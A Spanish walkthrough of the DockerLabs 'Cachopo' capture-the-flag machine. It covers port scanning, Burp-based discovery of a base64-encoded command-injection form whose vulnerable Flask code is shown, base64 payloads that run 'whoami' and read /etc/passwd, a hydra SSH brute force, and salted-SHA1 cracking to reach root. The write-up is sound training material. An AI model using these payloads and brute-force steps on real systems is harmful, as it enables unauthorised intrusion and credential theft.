Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "Cachopo".
Una vez hecho y COMO SIEMPRE, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh cachopo.tar
```
Lo primero de todo, tras desplegarse la maquina, es hacer un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 172.17.0.2 -n -Pn -vvv
```
Una vez terminado, vemos que tiene dos puertos abiertos, el 22 (SSH) y el 80 (HTTP).
```
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
```
Como no tenemos datos para entrar mediante SSH, vamos a abrir la pagina poniendo su IP en el navegador.

Una vez hecho esto, vemos que hay una pagina web de una especie de restaurante a punto de abrir llamado "Cachopazos Pingu".

Hay varios menus pero no parece que haya nada interesante.

Casi al final de la pagina, vemos un panel para hacer una reserva y poco mas.

Vamos primero a mirar el codigo fuente por si hubiera algo "interesante" oculto, pulsando "CTRL + U".

Tras inspeccionar el codigo fuente, no se ve nada con lo que podamos trabajar, asi que vamos a probar a hacer un poco de FUZZING WEB con "gobuster", por ejemplo:
```
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,asp,aspx,jsp,html -t 20
```
Tras esperar un buen rato, vemos que no podemos seguir por aqui.

Vamos a probar entonces a usar "BURPSUITE" intentando capturar la peticion del panel reservas que aparece en la pagina, a ver si hay suerte.

Para ello, abrimos el propio BURPSUITE y vamos a la pestaña superior donde pone "Proxy".

Una vez en esta pestaña, activamos la captura de peticion pinchando en la pestaña donde pone "Intercept is off", para que cambie a "Intercept is on".

Ahora tenemos dos opciones:

 1) En el navegador (en mi caso Firefox), vamos a "Settings/NetworkSettings" y elegimos la opcion "Manual proxy configuration" donde colocaremos la IP local 127.0.0.1 y el puerto 8080. Ahora solo nos quedaria darle a aceptar.
    
 2) La otra opcion (la que voy a  hacer yo), es instalar una extension llamada "FoxyProxy", configurarla (Options/Proxies) escribiendo Hostname 127.0.0.1, Port 8080 y  dandole un nombre (por ejemplo "Burp"). Ahora solo seria activarla.
 
Elijamos lo que elijamos, ya tendriamos el proxy configurado, por lo que escribiriamos en el panel de reserva de la pagina los datos para ver como se recogen en el servidor, mediante BURPSUITE.

Una vez hecha la captura con BURPSUITE, nos lo pasamos todo al "Repeater" (click segundo boton ==> Send to Repeater) quedandonos:
```
POST /submitTemplate HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://172.17.0.2/
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://172.17.0.2
Connection: keep-alive

userInput=prueba
```
Si ahora le damos al boton naranja superior donde pone "Send", y enviamos la informacion, en el panel de al lado "Response", vemos la siguiente informacion:
```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Wed, 07 Aug 2024 00:34:22 GMT
Content-Type: text/plain
Content-Length: 24
Connection: close

Error: Incorrect padding
```
Parece ser que lo manda bien, pero hay un problema y nos da un error: "Incorrect Padding".

Si probamos a cambiar en el panel izquierdo el "userInput" por letras y numeros (por ejemplo, "123prueba", nos devolveria el error:
```
Error: Invalid base64-encoded string: number of data characters (9) cannot be 1 more than a multiple of 4
```
Vale, hemos recibido 2 errores diferentes con dos "userInput" diferentes, asi que si buscamos en Google ambos errores, vemos que tienen relacion con la codificacion en "base64", por lo que vamos a intentar enviar el comando "whoami", codificado en "base64" para ver que ocurre.

Para ello, primero iremos a la terminal de nuestra maquina atacante y escribiremos:
```
echo "whoami" | base64
```
cuyo resultado seria:
```
d2hvYW1pCg==
```
Volvemos entonces a BURPSUITE y ponemos este resultado en el panel izquierdo, al final, donde teniamos el "userInput":
```
userInput=d2hvYW1pCg==
```
Ahora le damos a enviar (boton "Send" naranja) y en el panel derecho de respuesta vemos que en vez de aparecernos un error, simplemente nos aparece la palabra "cachopin":
```
cachopin
```
Bien, viendo que funciona este metodo, nuestra siguiente paso seria buscar usuarios en el equipo, pasando a "base64" el comando "cat /etc/passwd" para ver si nos lo muestra:
```
echo "cat /etc/passwd" | base64

Y2F0IC9ldGMvcGFzc3dkCg==
```
Si ahora probamos a poner esto en el "userInput" y le damos a "Send" vemos que nos sale todo el archivo "/etc/passwd" tal y como queriamos:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
cachopin:x:1001:1001::/home/cachopin:/bin/bash
```
Tal y como se puede ver, parece que solo hay un usuario llamado "cachopin", justo lo que nos aparecio al principio cuando escribimos "whoami".

Vale, perfecto. Es momento de usar HYDRA para ver si podemos conseguir la contraseña y acceder a la maquina mediante SSH. Para ello escribimos:
```
hydra -l cachopin -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
Tras un rato vemos que la contraseña para el usuario "cachopin" es "simple", tal y como se ve a continuacion:
```
[STATUS] 166.00 tries/min, 166 tries in 00:01h, 14344234 to do in 1440:12h, 15 active
[22][ssh] host: 172.17.0.2   login: cachopin   password: simple  <== Contraseña
1 of 1 target successfully completed, 1 valid password found
```
Es momento ahora de acceder via SSH:
```
ssh cachopin@172.17.0.2
```
Decimos "yes" a las fingerprints y etemos la contraseña "simple" obtenida con HYDRA.

Con esto, ya estariamos dentro:
```
cachopin@c7a551002841:~$ whoami
cachopin

cachopin@c7a551002841:~$
```
Bien vamos a probar a hacer una escalada de privilegios con "sudo -l", "suid", etc.. pero tras probar, vemos que no hay forma (o al menos, eso parece).

Es momento de intentar navegar por los directorios para ver si podemos conseguir mas informacion o alguna pista que nos pueda ayudar con la escalada.

Haciendo un "ls -la", vemos que hay un archivo llamado "entrypoint.sh", asi que le hacemos un "cat" para ver lo que contiene.
```
cachopin@c7a551002841:~$ cat entrypoint.sh 
#!/bin/bash

# Inicia el servicio SSH como root
service ssh start

# Cambia al usuario cachopin para ejecutar la aplicación Flask
exec su - cachopin -c "/home/cachopin/venv/bin/python /home/cachopin/app/app.py"
```
Bueno, nos da informacion y nos dice que que en la carpeta "/home/cachopin/app/" hay un archivo llamado "app.py" asi que vamos a dicha carpeta, hacemos un "ls" y vemos que hay 3 directorios, aparte del archivo "app.py" que estabamos buscando.

Aun asi, le hacemos un "cat" tambien para ver lo que contiene:
```
cachopin@c7a551002841:~$ cd app
cachopin@c7a551002841:~/app$ ls
app.py  com  static  templates

cachopin@c7a551002841:~/app$ cat app.py
from flask import Flask, request, render_template, Response
import base64
import subprocess

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submitTemplate', methods=['POST'])
def submit_Template():
    template = request.form.get('userInput', '')
    try:
        decoded = base64.b64decode(template).decode()
        process = subprocess.Popen(decoded, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        output_str = output.decode('utf-8') if output else ''
        error_str = error.decode('utf-8') if error else ''
        if error_str:
            return Response(f'Error: {error_str}', content_type='text/plain')
        return Response(output_str, content_type='text/plain')
    except Exception as e:
        return Response(f'Error: {str(e)}', content_type='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
    
cachopin@c7a551002841:~/app$
```
Bueno, ya vemos que es el codigo que hace que la pagina codifique en "base64" el panel de reservas.

Dejando esto de lado, seguimos investigando por la maquina y en concreto, en la carpeta "/app/" en la que estamos probamos con el resto a ver si obtenemos alguna pista mas:
```
cachopin@c7a551002841:~/app$ ls
app.py  com  static  templates

cachopin@c7a551002841:~/app$ cd com
cachopin@c7a551002841:~/app/com$ ls
personal

cachopin@c7a551002841:~/app/com$ cd personal
cachopin@c7a551002841:~/app/com/personal$ ls
hash.lst

cachopin@c7a551002841:~/app/com/personal$ cat hash.lst 
$SHA1$d$GkLrWsB7LfJz1tqHBiPzuvM5yFb=
$SHA1$d$BjkVArB9RcGUs3sgVKyAvxzH0eA=
$SHA1$d$NxJmRtB6LpHs9vJYpQkErzU8wAv=
$SHA1$d$BvKpTbC5LcJs4gRzQfLmHxM7yEs=
$SHA1$d$LxVnWkB8JdGq2rH0UjPzKvT5wM1=

cachopin@c7a551002841:~/app/com/personal$ cd ..
cachopin@c7a551002841:~/app/com$ cd ..
cachopin@c7a551002841:~/app$ ls
app.py  com  static  templates

cachopin@c7a551002841:~/app$ cd static
cachopin@c7a551002841:~/app/static$ ls
css  js

cachopin@c7a551002841:~/app/static$ cd ..
cachopin@c7a551002841:~/app$ cd templates
cachopin@c7a551002841:~/app/templates$ ls
index.html

cachopin@c7a551002841:~/app/templates$
```
Perfecto. Tras investigar un poco, lo unico que nos podria dar algo de informacion seria el archivo "hash.lst que esta en la carpeta /app/com/personal/"

Tal y como se puede observar, hay varios hashes SHA1, un tanto "extraños":
```
$SHA1$d$GkLrWsB7LfJz1tqHBiPzuvM5yFb=
$SHA1$d$BjkVArB9RcGUs3sgVKyAvxzH0eA=
$SHA1$d$NxJmRtB6LpHs9vJYpQkErzU8wAv=
$SHA1$d$BvKpTbC5LcJs4gRzQfLmHxM7yEs=
$SHA1$d$LxVnWkB8JdGq2rH0UjPzKvT5wM1=
```
Usando "John the Ripper" vamos a probar si conseguimos algo con el primer hash, por ejemplo. Para ello, creamos primero un archivo llamado "hash", por ejemplo, y metemos dentro el primero de ellos. Una vez hecho esto, probamos con "John" a ver si hay suerte:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
```
Pero vemos que no hay suerte. Pruebo con el 2do y el 3ro, con mismo resultado, asi que supongo que no funcionara.

Como los hashes que hemos obtenido son algo raros, pruebo lo mismo pero quitando la primera parte del archivo: el "$ SHA1 $" pero seguimos igual.

Tras pensar un rato como seguir (un rato largo ademas), vuelvo a "dockerlabs.es" y al elegir la maquina recuerdo que su creador "Patxasec" tiene pagina en "github".

La visito y veo que uno de sus repositorios es, curiosamente, uno llamado: "SHA_Decrypt" ("https://github.com/PatxaSec/SHA_Decrypt"), por lo que clono el repositorio y entro dentro de la carpeta.
```
git clone https://github.com/PatxaSec/SHA_Decrypt.git

Clonando en 'SHA_Decrypt'...
remote: Enumerating objects: 76, done.
remote: Counting objects: 100% (76/76), done.
remote: Compressing objects: 100% (76/76), done.
remote: Total 76 (delta 26), reused 0 (delta 0), pack-reused 0
Recibiendo objetos: 100% (76/76), 38.72 KiB | 1.05 MiB/s, listo.
Resolviendo deltas: 100% (26/26), listo.

cd SHA_Decrypt
❯ ls -la
drwxr-xr-x root root 4.0 KB Wed Aug  7 03:27:37 2024  .
drwxr-xr-x root root 4.0 KB Wed Aug  7 03:27:46 2024  ..
drwxr-xr-x root root 4.0 KB Wed Aug  7 03:27:37 2024  .git
.rw-r--r-- root root  34 KB Wed Aug  7 03:27:37 2024  LICENSE
.rw-r--r-- root root 2.3 KB Wed Aug  7 03:27:37 2024  README.md
.rw-r--r-- root root 1.9 KB Wed Aug  7 03:27:37 2024  sha2text.py
```
Vemos en su pagina de github como se utiliza este programa creado en Python "sha2text.py", asi que cogemos de nuevo el primer hash de los cinco que encontramos y probamos, aunque antes, instalamos una barra de porcentaje con el comando:
```
pip install tqdm
```
Y ahora si, ejecutamos el "sha2text.py":
```
python3 sha2text.py 'd' '$SHA1$d$GkLrWsB7LfJz1tqHBiPzuvM5yFb=' '/usr/share/wordlists/rockyou.txt'
```
Vemos una barrita de porcentaje, asi que esperamos a que termine.

Si embargo, con el primer hash de los cinco, recibimos el mensaje:
```
Processing: 100%|█████████████████| 14344392/14344392 [00:28<00:00, 504324.82it/s]

[!] Not found    <==== NO ha encontrado nada
```
Bueno, momento ahora de probar con el segundo hash (probaremos todos, hasta el quinto):
```
Processing:   7%|█▎                 | 992816/14344392 [00:01<00:25, 516110.64it/s]

 [+] Pwnd !!! $SHA1$d$BjkVArB9RcGUs3sgVKyAvxzH0eA=::::cecina   <=== Contraseña
```
Vale, por fin parece que tenemos la contraseña, por lo que vamos a probar si funciona:
```
cachopin@c7a551002841:~/app$ su root 
Password: 

root@c7a551002841:/home/cachopin/app# whoami
root

root@c7a551002841:/home/cachopin/app# 
```
Y listo !! Con esto estaria la maquina hecha. La verdad es que ha estado muy entretenida.
